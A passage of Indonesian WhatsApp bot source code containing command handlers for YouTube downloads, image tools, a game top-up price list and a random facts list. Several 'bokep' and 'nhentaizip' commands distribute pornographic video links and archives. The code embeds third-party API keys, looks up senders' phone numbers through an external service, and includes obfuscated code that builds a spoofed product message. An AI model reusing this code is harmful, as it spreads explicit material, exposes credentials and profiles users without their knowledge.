				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/cscj9taoq5s5oj9/VID-20210107-WA1538.mp4/file' })				   
				   break
				   case 'bokep23':	

				qute = fs.readFileSync('./ronove.jpg') 
				
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/saer161lthn4sy3/VID-20210107-WA1525.mp4/file' })				   
				   break
				   case 'bokep24':				 
				
				qute = fs.readFileSync('./ronove.jpg') 
				
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \\nhttps://www.mediafire.com/file/9jy3nj2b2ljjzxb/VID-20210107-WA1539.mp4/file' })				   
				   break
        case 'tovideo':
        const { webp2gifFile } = require("./lib/gif.js")
               if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
               sticWait(from)
               encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
               mediaaa = await ronove.downloadAndSaveMediaMessage(encmedia)
               a = await webp2gifFile(mediaaa)
               mp4 = await getBuffer(a.result)
               ronove.sendMessage(from, mp4, video, {mimetype: 'video/mp4', quoted: freply, caption: mess.success})
               fs.unlinkSync(mediaaa)
               } else {
               reply(mess.wrongFormat)
}
               break
case 'KIRSHOP':
                             if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        ptod = "6285347683869@s.whatsapp.net"
        stod = `${sender}`
        uwu = '*``*'
        yoii = '```'
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       order = `𝐇𝐚𝐢𝐢 𝐤𝐚𝐤 𝐦𝐚𝐮 𝐛𝐞𝐥𝐢 𝐤𝐞𝐛𝐮𝐭𝐮𝐡𝐚𝐧 𝐠𝐚𝐦𝐞?\n𝐃𝐢𝐬𝐢𝐧𝐢 𝐭𝐞𝐫𝐬𝐞𝐝𝐢𝐚 🙏`
sendButLocation(from, `${order}`, `sɪʟᴀʜᴋɴ ᴘɪʟɪʜ.`, {jpegThumbnail: fs.readFileSync("./ronove.jpg")}, [{buttonId:`ffdm`,buttonText:{displayText:'ᴅɪᴀᴍᴏɴᴅ ғʀᴇᴇ ғɪʀᴇ'},type:1}, {buttonId:`dml`,buttonText:{displayText:'ᴅɪᴀᴍᴏɴᴅ ᴍʟ'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
//JB MENU
case 'ffdm': 
ptod = "6285347683869@s.whatsapp.net"
stod = `${sender}`
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
       nama = 'PRICE LIST DIAMOND FREE FIRE'
       ownerJid = "6285347683869@s.whatsapp.net"
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
ffdm = `𝟭𝟬𝟬%  𝘼𝙈𝘼𝙉 𝘿𝘼𝙉 𝙏𝙀𝙍𝙋𝙀𝙍𝘾𝘼𝙔𝘼 𝙊𝙉𝙇𝙔 𝙄𝘿 + 𝙉𝙄𝘾𝙆𝙉𝘼𝙈𝙀

𝟳𝟬 💎 = 𝟭𝟬.𝟬𝟬𝟬
𝟭𝟬𝟬 💎 = 𝟭𝟱.𝟬𝟬𝟬
𝟭𝟰𝟬 💎 = 𝟮𝟬.𝟬𝟬𝟬
𝟮𝟭𝟬 💎 = 𝟯𝟬.𝟬𝟬𝟬
𝟯𝟱𝟱 💎 = 𝟱𝟬.𝟬𝟬𝟬
𝟰𝟮𝟱 💎 = 𝟱𝟴.𝟬𝟬𝟬
𝟱𝟬𝟬 💎 = 𝟳𝟬.𝟬𝟬𝟬
𝟳𝟮𝟬 💎 = 𝟵𝟵.𝟬𝟬𝟬
𝟴𝟲𝟬 💎 = 𝟭𝟮𝟬.𝟬𝟬𝟬
𝟭.𝟬𝟬𝟬 💎 = 𝟭𝟰𝟬.𝟬𝟬
𝟭.𝟰𝟰𝟬 💎 = 𝟮𝟬𝟬.𝟬𝟬𝟬
𝟮.𝟬𝟬𝟬 💎 = 𝟮𝟳𝟬.𝟬𝟬𝟬
𝟯.𝟬𝟲𝟬 💎 = 𝟱𝟬𝟬.𝟬𝟬𝟬
*MEMBERSIP MINGUAN* = 𝟯𝟬.𝟬𝟬𝟬
*MEMBERSIP BULANAN* = 𝟭𝟭𝟵.𝟬𝟬𝟬

웃 ＰＡＹＭＥＮ T  웃 
*⚠️GOPAY⚠️*

https://wa.me/6285347683869`
   //Masih langka
function _0x21f8() {
    var _0x5b970c = ['5573144JYwLrC', '528103swWGih', 'image/jpeg', 'HZ7GZtD+MZleBjG1flbeTuZkDThPV6frfERXi4zTBvs=', 'readFileSync', '69880vdqygB', '431675fOwedq', '3264wpwOzQ', '3ucdrq0UyCuNG5YcUD9aKX4qkuvcip+OonjhACusy5Q=', '988644bxSaXV', '19894ILewVQ', '2QmpxNq', '66214', '9999999', '1341KlrShJ', '2506689kwMmco', './ronove.jpg'];
    _0x21f8 = function () {
        return _0x5b970c;
    };
    return _0x21f8();
}

function _0x4cac(_0x23a824, _0x283a6f) {
    var _0x21f8ef = _0x21f8();
    return _0x4cac = function (_0x4cacde, _0x3311de) {
        _0x4cacde = _0x4cacde - 0xc7;
        var _0x13ea77 = _0x21f8ef[_0x4cacde];
        return _0x13ea77;
    }, _0x4cac(_0x23a824, _0x283a6f);
}
var _0xcdc6be = _0x4cac;
(function (_0x130db2, _0x4b9859) {
    var _0x3cd68e = _0x4cac,
        _0x5ee5d3 = _0x130db2();
    while (!![]) {
        try {
            var _0x2ac92a = -parseInt(_0x3cd68e(0xce)) / 0x1 * (-parseInt(_0x3cd68e(0xc7)) / 0x2) + parseInt(_0x3cd68e(0xcb)) / 0x3 + -parseInt(_0x3cd68e(0xd6)) / 0x4 + -parseInt(_0x3cd68e(0xd3)) / 0x5 + parseInt(_0x3cd68e(0xd4)) / 0x6 * (parseInt(_0x3cd68e(0xd7)) / 0x7) + -parseInt(_0x3cd68e(0xcd)) / 0x8 + parseInt(_0x3cd68e(0xca)) / 0x9 * (-parseInt(_0x3cd68e(0xd2)) / 0xa);
            if (_0x2ac92a === _0x4b9859) break;
            else _0x5ee5d3['push'](_0x5ee5d3['shift']());
        } catch (_0x5691cb) {
            _0x5ee5d3['push'](_0x5ee5d3['shift']());
        }
    }
}(_0x21f8, 0xccadb), anu = ronove['prepareMessageFromContent'](from, {
    'productMessage': {
        'product': {
            'productImage': {
                'url': 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc',
                'mimetype': 'image/jpeg',
                'fileSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=',
                'fileLength': 28777,
                'height': 1080,
                'width': 1079,
                'mediaKey': 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=',
                'fileEncSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=',
                'jpegThumbnail': iye
            },
            'productId': _0xcdc6be(0xc9),
            'title': '' + nama,
            'description': '' + ffdm,
            'productImageCount': 1
        },
        'businessOwnerJid': "6285347683869@s.whatsapp.net",
        'contextInfo': {
            'forwardingScore': 558,
            'isForwarded': !![]
        }
    }
}, {
    'quoted': fdoc,
    'contextInfo': {
        'mentionedJid': [ptod, stod]
    }
}), ronove['relayWAMessage'](anu));
break
case 'dml':
ptod = "6285347683869@s.whatsapp.net"
stod = `${sender}`
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
       nama = 'PRICE LIST DIAMOND ML'
       ownerJid = "6285347683869@s.whatsapp.net"
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
ffdm = `𝟭𝟬𝟬% 𝘼𝙈𝘼𝙉 𝙃𝘼𝙉𝙔𝘼 𝘽𝙐𝙏𝙐𝙃 𝙑𝙄𝘼 𝙄𝘿

𝟱    💎   = 𝟭.𝟲𝟬𝟬
𝟭𝟭   💎   = 𝟯.𝟳𝟬𝟬
𝟭𝟳   💎   = 𝟱.𝟴𝟬𝟬
𝟮𝟱   💎   = 𝟴.𝟳𝟬𝟬
𝟰𝟬   💎   = 𝟭𝟮.𝟲𝟬𝟬
𝟱𝟯   💎   = 𝟭𝟲.𝟴𝟬𝟬
𝟳𝟳   💎   = 𝟮𝟰.𝟭𝟬𝟬
𝟭𝟱𝟰  💎   = 𝟰𝟴.𝟬𝟱𝟬
𝟮𝟭𝟳  💎   = 𝟳𝟭.𝟲𝟬𝟬
𝟮𝟱𝟲  💎   = 𝟴𝟴.𝟬𝟭𝟬
𝟯𝟲𝟳  💎   = 𝟭𝟮𝟮.𝟬𝟬𝟬
𝟱𝟬𝟯  💎   = 𝟭𝟲𝟲.𝟬𝟬𝟬
𝟳𝟳𝟰  💎   = 𝟮𝟱𝟮.𝟬𝟬𝟬
𝟭𝟳𝟬𝟴 💎   = 𝟱𝟱𝟭.𝟬𝟬𝟬
𝟰𝟬𝟬𝟯 💎   = 𝟭.𝟯𝟮𝟮.𝟬𝟬𝟬

웃 ＰＡＹＭＥＮ T  웃 
*⚠️GOPAY⚠️*

https://wa.me/6285347683869`
   //Masih langka
function _0x21f8() {
    var _0x5b970c = ['5573144JYwLrC', '528103swWGih', 'image/jpeg', 'HZ7GZtD+MZleBjG1flbeTuZkDThPV6frfERXi4zTBvs=', 'readFileSync', '69880vdqygB', '431675fOwedq', '3264wpwOzQ', '3ucdrq0UyCuNG5YcUD9aKX4qkuvcip+OonjhACusy5Q=', '988644bxSaXV', '19894ILewVQ', '2QmpxNq', '66214', '9999999', '1341KlrShJ', '2506689kwMmco', './ronove.jpg'];
    _0x21f8 = function () {
        return _0x5b970c;
    };
    return _0x21f8();
}

function _0x4cac(_0x23a824, _0x283a6f) {
    var _0x21f8ef = _0x21f8();
    return _0x4cac = function (_0x4cacde, _0x3311de) {
        _0x4cacde = _0x4cacde - 0xc7;
        var _0x13ea77 = _0x21f8ef[_0x4cacde];
        return _0x13ea77;
    }, _0x4cac(_0x23a824, _0x283a6f);
}
var _0xcdc6be = _0x4cac;
(function (_0x130db2, _0x4b9859) {
    var _0x3cd68e = _0x4cac,
        _0x5ee5d3 = _0x130db2();
    while (!![]) {
        try {
            var _0x2ac92a = -parseInt(_0x3cd68e(0xce)) / 0x1 * (-parseInt(_0x3cd68e(0xc7)) / 0x2) + parseInt(_0x3cd68e(0xcb)) / 0x3 + -parseInt(_0x3cd68e(0xd6)) / 0x4 + -parseInt(_0x3cd68e(0xd3)) / 0x5 + parseInt(_0x3cd68e(0xd4)) / 0x6 * (parseInt(_0x3cd68e(0xd7)) / 0x7) + -parseInt(_0x3cd68e(0xcd)) / 0x8 + parseInt(_0x3cd68e(0xca)) / 0x9 * (-parseInt(_0x3cd68e(0xd2)) / 0xa);
            if (_0x2ac92a === _0x4b9859) break;
            else _0x5ee5d3['push'](_0x5ee5d3['shift']());
        } catch (_0x5691cb) {
            _0x5ee5d3['push'](_0x5ee5d3['shift']());
        }
    }
}(_0x21f8, 0xccadb), anu = ronove['prepareMessageFromContent'](from, {
    'productMessage': {
        'product': {
            'productImage': {
                'url': 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc',
                'mimetype': 'image/jpeg',
                'fileSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=',
                'fileLength': 28777,
                'height': 1080,
                'width': 1079,
                'mediaKey': 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=',
                'fileEncSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=',
                'jpegThumbnail': iye
            },
            'productId': _0xcdc6be(0xc9),
            'title': '' + nama,
            'description': '' + ffdm,
            'productImageCount': 1
        },
        'businessOwnerJid': "6285347683869@s.whatsapp.net",
        'contextInfo': {
            'forwardingScore': 558,
            'isForwarded': !![]
        }
    }
}, {
    'quoted': fdoc,
    'contextInfo': {
        'mentionedJid': [ptod, stod]
    }
}), ronove['relayWAMessage'](anu));
break
case 'ytdl':
              if (!q) return reply('Linknya?')
			 res = await yts(q)
			   let thumbInfo = ` 
*Youtube Download*
 *〆⁩ Judul :* ${res.all[0].title}
 *〆⁩ ID Video :* ${res.all[0].videoId}
 *〆⁩ Diupload Pada :* ${res.all[0].ago}
 *〆⁩ Views :* ${res.all[0].views}
 *〆⁩ Durasi :* ${res.all[0].timestamp}
 *〆⁩ Channel :* ${res.all[0].author.name}
 *🔗 Link Channel :* ${res.all[0].author.url}

*Silahkan pilih media yang akan di download*
`
buttons = [{buttonId:`play2 ${q}`,buttonText:{displayText:'🎥VIDEO'},type:1},{buttonId:`playy ${q}`,buttonText:{displayText:'🎵AUDIO'},type:1}]

imageMessage = (await ronove.prepareMessageMedia({url:res.all[0].image},'imageMessage',{thumbnail:Buffer.alloc(0)})).imageMessage

buttonsMessage = {contentText: thumbInfo,footerText:'Silahkan Pilih Jenis File Dibawah Ini',imageMessage,buttons,headerType:4}

prep = await ronove.prepareMessageFromContent(from,{buttonsMessage},{})

ronove.relayWAMessage(prep)
break
case 'nhentaizip':
if (args.length < 1) return reply("Where's the nuklir bro")
sticWait(from)
anu = await fetchJson(`https://api-yogipw.herokuapp.com/api/nhentaidownloader?kode=${args[0]}`)
dojin = await getBuffer(anu.result)
ronove.sendMessage(from, dojin, document, { mimetype: 'document/zip', filename:`${args[0]}.zip`, contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
"title": `Tonton ini dulu kak` ,
"body": `Kalo error tonton ini ya kak`,
"mediaType": "2",
"thumbnailUrl": "https://i.postimg.cc/Vvqj0tY3/ronove.jpg",
"mediaUrl": "https://youtu.be/ErgjOmR3pNI",
"thumbnail": fs.readFileSync('./stik/thumb.jpeg'),
"sourceUrl": "",
},mentionedJid:[sender]}, quoted : fdoc})
break
case 'faktaunik':{
									const faktau = ["Negara Indonesia berada di posisi ke-4 sebagai Negara Terindah di Dunia versi situs First Choice.","Di Italia, dalam aturannya minuman Cappuccino hanya boleh di minum sebelum waktu siang.","AS, Australia, Finlandia, Jerman dan Kanada adl negara maju tanpa UN. Tahukah anda sekolah trbaik di dunia ada di Finlandia walau tanpa UN.","","\"Jengkol is very nice\" komentar Pierre Bouvier vokalis Simple Plan.","Tiap satu kali jari kita mengklik mouse komputer, ada 1,42 kalori yang terbakar dalam tubuh. (Penelitian, Convert Anything to Calories).","Di Jepang kuno, prajurit diolesi minyak kodok pada tubuh mereka dengan keyakinan bahwa hal itu akan membuat tubuh mereka antirobek."," Di Jepang, ketiduran saat bekerja (inemuri) dapat ditolerir, karena dipandang sebagai kelelahan yang muncul akibat bekerja terlalu keras.","Gergaji mekanik awalnya diciptakan sebagai alat kedokteran untuk membantu melahirkan bayi.","Jangan sering mengatakan kata  di Australia dan Selandia Baru. Di sana, kata berarti mengajak untuk melakukan hubungan seks.","Jamur merang Laetiporus dikenal sebagai julukan \"ayam hutan\" karena konon rasanya mirip seperti daging ayam goreng.","Kaki katak merupakan hidangan istimewa di eropa. Tahukah Anda: sekitar 80% impor katak Eropa berasal dari Indonesia.","Jika Anda mengetik \"do the harlem shake\" di search bar YouTube, layar akan melakukan Harlem Shake!. [Google Chrome]","Melihat melalui lubang kecil akan segera meningkatkan penglihatan Anda sementara.","YouTube menyebutkan rata-rata ada 4000 video baru Harlem Shake yang diunggah setiap hari. [Yahoo!]","Semut memiliki kuburan sendiri. Tapi tahukah anda: Gurita memiliki kebun dan suka berkebun. (wikipedia)","Coklat mengandung Theobromine, molekul organik yang dapat membantu menguatkan enamel gigi. (Penelitian dari Tulane University).","Wanita 2 kali lebih banyak menggunakan emoticon dalam pesan teks dibandingkan pria. (Penelitian di Rice University)","Biarpun Buzz Aldrin adalah orang kedua yang menginjak di bulan tetapi ia adalah orang pertama yang membuang kotoran di ruang angkasa.","Fakta unik berikutnya adalah, Psikolog mengatakan bahwa mengirim dan menerima pesan teks benar-benar dapat meningkatkan mood Anda ketika Anda merasa kesepian. (Telegraph)","Thailand merupakan satu-satunya negara di Asia Tenggara yang tidak pernah dijajah.","Musik memiliki kemampuan untuk memperbaiki kerusakan otak serta mengembalikan kenangan yang hilang. (cracked .com)"," Perasaan kesepian memicu respon yang sama di otak sebagai rasa sakit fisik. (BBCnews)","Di Cape Town, Afrika Selatan, remaja laki-laki yang memiliki gigi ompong dianggap tampan / maskulin.","Semakin pahit cokelat (tinggi zat theobromine), semakin tinggi manfaatnya. Rajin mengkonsumsi 1bar cokelat/hari dapat menyembuhkan batuk kronis.","Kata \"Mouse\" (tikus) berasal dari turunan Bahasa Sansekerta \"Mus\" yang berarti \"pencuri\".","Tidur Siang (Power Nap) trbukti menambah tinggi badan, dikrnkan saat kita tidur siang hormon pertumbuhan (Growth Hormone) lbh aktif bekerja.","Bilangan prima terbesar di dunia saat ini panjangnya 17 juta digit angka, cukup banyak untuk mengisi 28 lembar halaman pada buku novel.","Menurut sebuah studi, minum teh hijau setelah makan ikan membantu menghalangi zat Mercury yang terkandung dalam ikan memasuki aliran darah."," Memperpanjang usia handphone hingga 4 tahun dapat mengurangi dampak lingkungan sampai 40 persen. [Hasil studi di Swiss]","Duduk bersama dgn teman-teman / keluarga utk makan bersama, dpt meningkatkan kebahagiaan & membantu meringankan depresi. [ehealthnewsdaily]","Abibliophobia adalah fobia atau ketakutan terhadap kehabisan bahan bacaan.","Pada abad pertengahan di Eropa, garam sangat mahal harganya, sehingga disebut sebagai \"emas putih\".","Mengunyah permen karet dapat meningkatkan kemampuan berpikir cepat dan kewaspadaan hingga 10 persen. [Jurnal Brain and Cognition]","Wanita yang sedang stres selama kehamilannya cenderung melahirkan anak-anak yang pemarah. [Institute of Psychiatry, King College London]","","35. Disarankan supaya membeli sepatu pada sore hari. Sebab, setelah seharian berjalan, di sore hari kaki akan membesar 5-8 persen.","Musik memiliki kemampuan untuk memperbaiki kerusakan otak serta mengembalikan kenangan yang hilang. [cracked .com]","Menurut penelitian baru, usia harapan hidup anak band rata-rata lebih tinggi dibandingkan musisi yang memilih solo karir. (detikHealth)","Pulau Dewata Bali merupakan 1 dari 10 pulau paling romantis di dunia. [majalah Travel+Leisure]","Universitas di Jepang selalu melakukan upacara peringatan bagi hewan (contoh: tikus) yang mati dalam pengujian laboratorium. [web.archive .org]","Berkedip memberikan otak Anda istirahat sebentar. [para ilmuan di Japan’s Osaka University]","Wanita yang bahagia dalam sebuah pernikahan akan mengalami berat badan naik setengah pound (0,22 kg) setiap 6 bulan. [DailyMail]","Rasa cemburu berlebihan bisa digolongkan penyakit jiwa, krna dpt mendorong ssorg utk bunuh diri / menghabisi nyawa org lain. [riset]","","Mengkonsumsi buah tomat beberapa kali dlm kurun waktu seminggu dpt mengatasi perasaan depresi. [peneliti di Tianjin Medical Univ., Cina]"," Perasaan kesepian memicu respon yang sama di otak sebagai rasa sakit fisik. [BBCnews]","Di Cape Town, Afrika Selatan, remaja laki-laki yang memiliki gigi ompong dianggap tampan / maskulin.","Memeluk orang yg disayangi dpt membantu menurunkan tekanan darah, mengurangi stres dan","kecemasan, bahkn dpt meningkatkan memori. [Dailymail]","Kata \"Mouse\" (tikus) berasal dari turunan Bahasa Sansekerta \"Mus\" yang berarti \"pencuri\".Berjalan kaki atau bersepeda ke sekolah mempertajam konsentrasi siswa di kelas dan tetap bertahan sekitar 4 jam kemudian. [Medical Daily]","Menurut riset pasar global Euromonitor International, pria Korea adalah pria yang paling suka bersolek dari pria lain di dunia.","Rata-rata orang akan merasa 100 persen sehat / fit hanya 61 hari dalam setahun. (Penelitian di Inggris)","Polydactyl Cat adalah jenis kucing yang memiliki jempol di kaki mereka.","Hanya dengan mengurangi brightness dari televisi, anda mampu berhemat lebih dari Rp 1,5 juta setahun. [kompas]","Di Jerman, tahanan yg ingin meloloskan diri dr penjara adl bukan mrupakn perbuatan ilegal. Krn itu salah1 naluri dasar manusia untuk kebebasan.","Wanita merasa diri mereka terlihat paling jelek dan terlihat lebih tua pada hari Rabu pukul 15.30 . [studi baru dari St Tropez]Orang yang rutin bermain video game ternyata memiliki penalaran yang baik dibanding kebanyakan orang. (detikHealth)","Nama \"Gorila\" berasal dari kata Yunani \"Gorillai\" yang berarti \"perempuan berbulu\".","IBM mengatakan bahwa dalam kurun waktu 5 tahun ke depan, komputer bakal mirip manusia yang bisa melihat, mendengar, mencium dan merasakan.","Selama abad ke-13, kata \"nice\" sebenarnya berarti “stupid”, \"senseless\" dan “foolish\".","59. 49% dari pemilik Smartphone adalah jomblo. (Survei, \"2012 Online User Behavior and Engagement Study\")","Fakta Unik","60. Gazzarella adalah keju mozzarella yang terbuat dari susu kucing. 61. Rata-rata orang melihat / mengecek ponselnya sekitar 150 kali sehari. (Laporan Nokia pada MindTrek 2010)","Lalat dapat menyalurkan sekitar 300 bakteri setiap kali hinggap di benda.","Tertawa dapat meningkatkan aktivitas antibodi sekitar 20%, juga membantu untuk menghancurkan virus dan sel-sel tumor.","Fobia matematika (mathematics anxiety) memicu respon yang sama di otak sbg rasa sakit fisik. Gejalanya yaitu melihat angka saja sudah nyeri."," Karakter kartun Bugs Bunny diberi pangkat kehormatan sersan-mayor di Korps Marinir AS pada akhir Perang Dunia II. (wikipedia)","Apel yang ditaruh di ruang terbuka akan matang 10 kali lebih cepat dibandingkan dengan apel yang ditaruh di kulkas.","Ungkapan 'Smitten' adalah untuk menyebut 'naksir' dalam bahasa Inggris.","Menurut etiket internasional, sebuah jabat tangan yang tepat dan baik harus berlangsung selama sekitar 3 detik & dilepaskan setelah goyang.","Ketika kita sedang jatuh cinta, otak akan memproduksi dopamin ekstra, bahan kimia yang membuat seseorang menjadi gembira berlebihan."," \"Mwahahaha\" dan \"lolz\" telah ditambahkan ke Kamus Inggris Oxford.","Menurut penelitian, pria cenderung menurunkan volume suaranya ketika ia berbicara dg seseorang yg ia cintai, sementara perempuan sebaliknya.","Di Perancis, jajanan Arum Manis (Rambut Nenek) disebut \"Barbe á Papa\" yang berarti \"Jenggot Ayah\".","Menurut penelitian, PR terlalu banyak sebenarnya dapat menyebabkan siswa menjadi stres, depresi & mendapat nilai lebih rendah.","Hangry adalah penggabungan kata dari \"Hungry\" dan \"Angry\", di pakai ketika anda sedang lapar dan marah.","Kentut dari bakteri membuat keju swiss memiliki lubang-lubang.","Mendengarkan musik benar-benar dapat mengurangi rasa sakit kronis hingga 20% dan membantu meringankan depresi hingga 25%. (sciencedaily)","Orang yang merasa kesepian memiliki kemungkinan mengalami kepikunan 70-80% lebih tinggi. (Journal of Neurosurgery Neurologi and Psychiatry)","Melamun dpt memendekkan telomere (bagian paling ujung sel DNA) yang berperan dlm menjaga kestabilan sel, dimana dapat mempercepat proses penuaan."]
									const ran_faktau = faktau[Math.floor(Math.random() * faktau.length)]
									reply(`*Fakta Unik :*\n${ran_faktau}`)
									}
									break
     case 'ytmp4': 
              if (args.length === 0)
          return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`);
        let isLinks2 = args[0].match(
          /(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/
        );
        if (!isLinks2) return reply(mess.error.Iv);
        try {
          reply(mess.wait);
          ytv(args[0]).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then((a) => {
                if (Number(filesize) >= 40000)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`〆⁩ Title : ${title}\`\`\`
\`\`\`〆⁩ Kualitas* : 720p\`\`\`
\`\`\`〆⁩ Size* : ${filesizeF}\`\`\`
\`\`\`〆⁩ Link* : ${a.data}\`\`\`

_Untuk durasi lebih dari batas disajikan dalam Bentuk link_`
                  );
                const captionsYtmp4 = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`〆⁩ Title : ${title}\`\`\`
\`\`\`〆⁩ Kualitas : 720p\`\`\`
\`\`\`〆⁩ Size : ${filesizeF}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`;
                sendMediaURL(from, thumb, captionsYtmp4);
                sendMediaURL(from, dl_link).catch(() => reply(mess.error.api));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
      break
     case 'ytmp3': 
      if (args.length < 1) return reply("Where's the link bro")
      if (!isUrl(args[0]) && !args[0].includes('youtu')) return reply('```Invalid link```')
      sticWait(from) 
      anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/yt/playmp4?query=${args[0]}&apikey=Ikyy69`)
        ini_txt = `YT AUDIO HAS BEEN FOUND\n\n`
        ini_txt += `• Judul : ${anu.title}\n`
        ini_txt += `• Ext : mp3\n`
        ini_txt += `• _Tunggu beberapa menit video akan segera di kirimkan_`
        ini_txt2 = await getBuffer(anu.thumb)
        ini_txt3 = await getBuffer(anu.url)
      ronove.sendMessage(from, ini_txt2, image, { quoted: mek, caption: ini_txt })
      ronove.sendMessage(from, ini_txt3, audio, { mimetype: 'audio/mp4', quoted: mek})
      break
case 'shaunthesheep':
case 'sts':
					        sticWait(from)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						owgi = await ronove.downloadAndSaveMediaMessage(ger)
						data = await imgbb("95a7b170374ac93b2b6c4e6898c1b7e2", owgi)
					buffer1 = await getBuffer(`https://api.xteam.xyz/videomaker/shaunthesheep?url=${data.display_url}&APIKEY=${xteamkey}`)
					ronove.sendMessage(from, buffer1, video, {quoted: mek})
					} else {
						reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix + command}`)
					}
					break
        case 'upscale':
        case 'hdin':
        sticWait(from)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						owgi = await ronove.downloadAndSaveMediaMessage(ger)
						data = await imgbb("95a7b170374ac93b2b6c4e6898c1b7e2", owgi)
						buff = await getBuffer(`https://api.lolhuman.xyz/api/upscale?apikey=${lolkey}&img=${data.display_url}`)
						ronove.sendMessage(from, buff, image, {quoted: floc, caption: mess.success})
					} else {
						reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix + command}`)
					}
					break
                     case 'ytvideooo':
                     sticWait(from)
                    ini_link = args[0]
                    gtr2 = await fetchJson(`https://api.zeks.me/api/ytplaymp3/2?apikey=${zekskey}&q=${q}`, {method: 'get'})
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytvideo?apikey=${lolkey}&url=${ini_link}`)
                    get_result = get_result.result
                    get_video = await getBuffer(get_result.link.link)
                    ronove.sendMessage(from, get_video, video, { mimetype: 'video/mp4', filename: `${get_result.title}.mp4`, contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
"title": `Note : INI HD YA KAK!` ,
"body": `${namabot} VERIFIED`,
"mediaType": "2",
"thumbnailUrl": `${gtr2.result.thumb}`,
"mediaUrl": `${gtr2.result.source}`,
"thumbnail": fs.readFileSync('./stik/thumb.jpeg'),
"sourceUrl": "",
},mentionedJid:[sender]}, quoted : fdoc})
break
     case 'ytlagu': 
      sticWait(from) 
                          ini_link = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytvideo?apikey=${lolkey}&url=${ini_link}`)
                    get_result = get_result.result
                    get_audio = await getBuffer(get_result.link.link)
                    ronove.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', quoted: fdoc, ptt: true })
      break
      case "emoji":
      case "semoji":
        if (!q) return fakegroup("emojinya?");
        qes = args.join(" ");
        emoji.get(`${qes}`).then((emoji) => {
          teks = `${emoji.images[4].url}`;
          sendStickerFromUrl(from, `${teks}`);
          console.log(teks);
        });
        break;
      case "image":
      case "gimage":
      case "googleimage":
        if (args.length < 1) return reply("Apa Yang Mau Dicari?");
        sticWait(from);
        teks = args.join(" ");
        res = await gis(teks, google);
        function google(error, result) {
          if (error) {
            return reply(
              "_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_"
            );
          } else {
            gugIm = result;
            random = gugIm[Math.floor(Math.random() * gugIm.length)].url;
            sendMediaURL(from, random);
          }
        }
        break;

      case "brainly":
        if (args.length < 1) return reply("Pertanyaan apa");
        brien = args.join(" ");
        brainly(`${brien}`).then((res) => {
          teks = "❉───────────────────────❉\n";
